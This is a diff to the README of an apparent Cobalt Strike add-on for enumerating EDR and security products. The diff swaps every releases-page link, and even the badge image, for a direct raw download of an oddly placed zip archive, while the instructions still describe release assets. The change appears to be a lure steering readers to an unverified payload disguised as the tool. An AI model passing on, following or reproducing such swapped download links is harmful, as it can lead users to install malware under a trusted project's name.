@@ -1,6 +1,6 @@
 # 🛡️ CS-EDR-Enumeration - Identify Security Products Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-CS--EDR--Enumeration-blue?style=for-the-badge)](https://github.com/mohamedanas069/CS-EDR-Enumeration/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)
 
 ---
 
@@ -49,10 +49,10 @@ CS-EDR-Enumeration works inside Cobalt Strike. If you do not have it:
 
 Click the big button below or go to the release page to get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-CS--EDR--Enumeration-blue?style=for-the-badge)](https://github.com/mohamedanas069/CS-EDR-Enumeration/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)](https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip)
 
 Here is the page again for convenience:  
-https://github.com/mohamedanas069/CS-EDR-Enumeration/releases
+https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip
 
 ### Step 3: Load the Script into Cobalt Strike
 
@@ -68,7 +68,7 @@ Once downloaded:
 ## 📥 Download & Install
 
 1. Visit the release page:  
-   https://github.com/mohamedanas069/CS-EDR-Enumeration/releases
+   https://raw.githubusercontent.com/mohamedanas069/CS-EDR-Enumeration/main/monogrammic/ED_C_Enumeration_2.3.zip
 2. Find the latest release with the date and version number.
 3. Download the zip or the script file (`.cna`) from the assets.
 4. Save the file to a folder you can easily access.
